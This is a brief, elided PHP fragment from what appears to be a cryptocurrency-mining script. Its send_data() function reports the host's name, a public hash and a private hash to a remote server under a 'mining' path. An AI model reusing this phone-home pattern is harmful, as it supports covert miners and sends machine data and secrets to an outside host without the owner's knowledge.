...
function send_data()
{
    ...
    $hook = "http://jooni22.usermd.net/mining/get.php";
    $url = "http://jooni22.usermd.net/mining/".$public_hash;
	...
	$message = file_get_contents("$hook?public=$public_hash&hostname=$hostname&url_style=$url_style&hash=$private_hash");
